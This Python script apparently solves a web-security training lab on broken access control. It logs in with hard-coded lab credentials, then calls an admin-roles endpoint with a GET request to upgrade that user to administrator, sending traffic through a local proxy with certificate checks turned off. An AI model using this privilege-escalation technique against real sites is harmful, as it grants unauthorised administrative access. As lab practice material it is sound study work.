import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def is_login_successful(url, session):
    login_url = url + "/login"
    data = {
    "username": "wiener",
    "password": "peter"}
    response = session.post(
         login_url,
         data=data,
         verify=False,
         proxies=proxies)
    return "Log out" in response.text

def is_role_upgrade_successful(url, session):
    admin_roles_url = (
        url + "/admin-roles?username=wiener&action=upgrade")
    response = session.get(
        admin_roles_url,
        verify=False,
        proxies=proxies
    )
    return "Admin panel" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        if not is_role_upgrade_successful(url, session):
            print("[-] Changing role was not successful.")
            sys.exit(FAIL)
        print("[+] The Access Control attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 